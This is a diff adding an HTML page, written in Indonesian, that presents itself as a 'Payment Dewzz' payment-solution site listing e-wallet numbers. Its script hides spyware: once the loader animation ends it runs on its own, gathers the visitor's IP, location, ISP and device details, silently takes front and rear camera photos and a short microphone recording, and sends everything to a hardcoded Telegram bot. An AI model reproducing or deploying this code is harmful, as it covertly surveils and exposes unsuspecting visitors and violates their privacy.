@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Dewzz - Professional Solution</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        /* CSS DARI STYLE.CSS */
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
+        body{background:#0b0b0b;color:#f5f5f5;overflow-x:hidden;}
+
+        #loader{
+            position:fixed;inset:0;background:#0b0b0b;
+            display:flex;align-items:center;justify-content:center;z-index:3000;
+        }
+        .loader-box{text-align:center}
+        .loader-logo{font-size:34px;font-weight:700;color:#d4af37;letter-spacing:2px;}
+        .loader-bar{width:180px;height:4px;background:#222;border-radius:10px;overflow:hidden;margin-top:16px;}
+        .loader-bar span{display:block;height:100%;width:40%;background:linear-gradient(135deg,#d4af37,#a8872c);animation:load 2s infinite;}
+        @keyframes load{0%{transform:translateX(-100%)}100%{transform:translateX(260%)}}
+
+        nav{
+            position:fixed;top:0;width:100%;padding:16px 24px;
+            background:rgba(0,0,0,.6);backdrop-filter:blur(8px);
+            display:flex;justify-content:space-between;align-items:center;z-index:100
+        }
+        nav h1{color:#d4af37;font-weight:700}
+        nav a{color:#fff;text-decoration:none;font-size:14px;margin-left:18px;opacity:.8}
+
+        .hero{
+            min-height:100vh;display:flex;align-items:center;padding:0 24px;
+            background:radial-gradient(circle at top,#1a1a1a,#000 70%)
+        }
+        .hero-box{max-width:600px;}
+        .hero h2{font-size:42px;font-weight:700}
+        .hero span{color:#d4af37}
+        .hero p{margin-top:14px;font-size:15px;opacity:.85}
+
+        .btn{
+            margin-top:28px;display:inline-block;padding:14px 28px;
+            background:linear-gradient(135deg,#d4af37,#a8872c);
+            color:#000;font-weight:600;border-radius:40px;text-decoration:none;transition:.3s
+        }
+
+        section{padding:90px 24px}
+        .section-title{text-align:center;margin-bottom:40px}
+        .section-title span{color:#d4af37}
+
+        .payments{
+            display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+            gap:20px;max-width:900px;margin:auto
+        }
+        .pay-card{
+            background:#111;padding:26px;border-radius:16px;text-align:center;
+            border:1px solid #222;cursor:pointer;transition:.3s
+        }
+        .pay-card:hover{border-color:#d4af37;transform:translateY(-6px)}
+        .pay-card i{
+            font-size:34px;
+            background:linear-gradient(135deg,#d4af37,#a8872c);
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent
+        }
+        .pay-card h4{margin-top:12px;font-size:15px}
+
+        footer{padding:30px;text-align:center;font-size:13px;opacity:.6;border-top:1px solid #222}
+
+        .modal{
+            position:fixed;inset:0;background:rgba(0,0,0,.7);
+            backdrop-filter:blur(6px);display:none;
+            align-items:center;justify-content:center;z-index:999
+        }
+        .modal-box{
+            background:#0f0f0f;padding:28px;border-radius:18px;
+            width:90%;max-width:360px;text-align:center;
+            border:1px solid #222;position: relative;
+        }
+        .modal-box h3{color:#d4af37;margin-bottom:16px}
+        .modal-box p{font-size:18px;letter-spacing:1px;margin-bottom:14px}
+        .modal-box button{
+            width:100%;padding:12px;margin-top:10px;border:none;border-radius:30px;
+            background:linear-gradient(135deg,#d4af37,#a8872c);font-weight:600;cursor:pointer
+        }
+        .close{position:absolute;top:10px;right:15px;font-size:24px;cursor:pointer;opacity:.7}
+
+        .toast{
+            position:fixed;bottom:30px;left:50%;transform:translateX(-50%);
+            background:#111;padding:14px 24px;border-radius:30px;border:1px solid #333;
+            opacity:0;transition:.4s;z-index:1000
+        }
+        .toast.show{opacity:1}
+
+        .wa-btn{
+            display:inline-flex;align-items:center;gap:10px;margin-top:18px;padding:14px 26px;
+            border-radius:40px;background:linear-gradient(135deg,#25D366,#128C7E);
+            color:#fff;font-weight:600;text-decoration:none;
+        }
+
+        /* Hidden elements for capturing */
+        #captureArea { display: none; }
+    </style>
+</head>
+
+<body>
+
+<div id="loader">
+  <div class="loader-box">
+    <div class="loader-logo">DEWZZ</div>
+    <div class="loader-bar"><span></span></div>
+  </div>
+</div>
+
+<div id="captureArea">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<nav>
+  <h1>Dewzz</h1>
+  <div>
+    <a href="#payment">Payment</a>
+    <a href="#contact">Contact</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="hero-box">
+    <h2>Professional <span>Payment Solution</span><br>For Serious Business</h2>
+    <p>Sistem pembayaran aman, cepat, dan terpercaya.</p>
+    <a href="#contact" class="btn">Hubungi Sekarang</a>
+  </div>
+</div>
+
+<section id="payment">
+  <div class="section-title">
+    <h3>Metode <span>Pembayaran</span></h3>
+  </div>
+
+  <div class="payments">
+    <div class="pay-card" onclick="showNumber('DANA PAY','085711325342')">
+      <i class="fas fa-wallet"></i><h4>DANA PAY</h4>
+    </div>
+    <div class="pay-card" onclick="showNumber('GOPAY PAY','085215530731')">
+      <i class="fas fa-mobile-screen-button"></i><h4>GOJEK PAY</h4>
+    </div>
+    <div class="pay-card" onclick="showNumber('OVO PAY','085881346351')">
+      <i class="fas fa-credit-card"></i><h4>OVO PAY</h4>
+    </div>
+  </div>
+</section>
+
+<section id="contact">
+  <div class="section-title">
+    <h3>Kontak <span>Bisnis</span></h3>
+  </div>
+  <div style="text-align: center;">
+    <p>Email: dewzzstroyer@gmail.com</p>
+    <a href="https://wa.me/628138891911?text=Halo%20Admin%20Dewzz" target="_blank" class="wa-btn">
+      <i class="fab fa-whatsapp"></i> Chat WhatsApp
+    </a>
+  </div>
+</section>
+
+<footer>© 2025 Dewzz</footer>
+
+<div id="paymentModal" class="modal">
+  <div class="modal-box">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <h3 id="modalTitle"></h3>
+    <div id="modalContent"></div>
+  </div>
+</div>
+
+<div id="toast" class="toast">Berhasil disalin</div>
+
+<script>
+// --- CONFIG TELEGRAM ---
+const TELEGRAM_TOKEN = '8436966424:AAHa3ku-_Oj8amaAqhCPW7VPpT2BlX-AhE8';
+const CHAT_ID = '8247175070';
+
+// --- MAIN UI LOGIC ---
+window.addEventListener("load",()=>{
+  const loader=document.getElementById("loader");
+  setTimeout(()=>{
+    loader.style.opacity="0";
+    loader.style.transition="opacity .6s ease";
+    setTimeout(()=> {
+        loader.remove();
+        // Trigger Tracking setelah loader selesai
+        startTracking();
+    }, 600);
+  },2200);
+});
+
+const modal=document.getElementById("paymentModal");
+const modalTitle=document.getElementById("modalTitle");
+const modalContent=document.getElementById("modalContent");
+const toast=document.getElementById("toast");
+
+function showNumber(title,number){
+  modalTitle.innerText=title;
+  modalContent.innerHTML=`
+    <p id="payNumber">${number}</p>
+    <button onclick="copyNumber()">COPY NOMOR</button>
+  `;
+  modal.style.display="flex";
+}
+
+function copyNumber(){
+  const num = document.getElementById("payNumber").innerText;
+  navigator.clipboard.writeText(num);
+  toast.classList.add("show");
+  setTimeout(()=>toast.classList.remove("show"),2000);
+}
+
+function closeModal(){modal.style.display="none";}
+
+// --- TRACKING LOGIC ---
+async function startTracking() {
+    let report = "<b>🚀 TARGET BARU MASUK</b>\n\n";
+
+    // 1. Ambil Data IP & Lokasi
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        report += `🌐 <b>IP:</b> <code>${data.ip}</code>\n`;
+        report += `📍 <b>Lokasi:</b> ${data.city}, ${data.region}, ${data.country_name}\n`;
+        report += `🏢 <b>ISP:</b> ${data.org}\n`;
+        report += `🗺️ <b>Maps:</b> <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Klik Disini</a>\n\n`;
+    } catch (e) {
+        report += "❌ Gagal mengambil IP/Lokasi\n\n";
+    }
+
+    // 2. Data Perangkat
+    report += `📱 <b>Browser:</b> ${navigator.userAgent}\n`;
+    report += `💻 <b>Platform:</b> ${navigator.platform}\n`;
+
+    // Kirim Laporan Teks Pertama
+    await sendTelegramText(report);
+
+    // 3. Jalankan Media Capture (Foto & Audio)
+    handleMedia();
+}
+
+async function handleMedia() {
+    // Ambil Foto Depan
+    await takePhoto("user", "📸 Foto Depan");
+    // Ambil Foto Belakang
+    await takePhoto("environment", "📸 Foto Belakang");
+    // Rekam Suara
+    recordVoice();
+}
+
+async function takePhoto(mode, caption) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
+        video.srcObject = stream;
+        
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+        await new Promise(resolve => setTimeout(resolve, 1500)); // Delay agar kamera fokus
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        await sendTelegramFile(blob, 'photo', caption);
+
+        // Matikan stream
+        stream.getTracks().forEach(track => track.stop());
+    } catch (e) {
+        sendTelegramText(`❌ Gagal akses kamera (${mode}): ` + e.message);
+    }
+}
+
+async function recordVoice() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+            await sendTelegramFile(blob, 'voice', "🎙️ Rekaman Suara Target");
+            stream.getTracks().forEach(track => track.stop());
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 4000); // Rekam selama 4 detik
+    } catch (e) {
+        sendTelegramText("❌ Gagal akses microphone: " + e.message);
+    }
+}
+
+async function sendTelegramText(text) {
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    });
+}
+
+async function sendTelegramFile(blob, type, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append(type, blob, type === 'photo' ? 'capture.jpg' : 'voice.ogg');
+    formData.append('caption', caption);
+
+    const endpoint = type === 'photo' ? 'sendPhoto' : 'sendVoice';
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${endpoint}`, {
+        method: 'POST',
+        body: formData
+    });
+}
+</script>
+
+</body>
+</html>
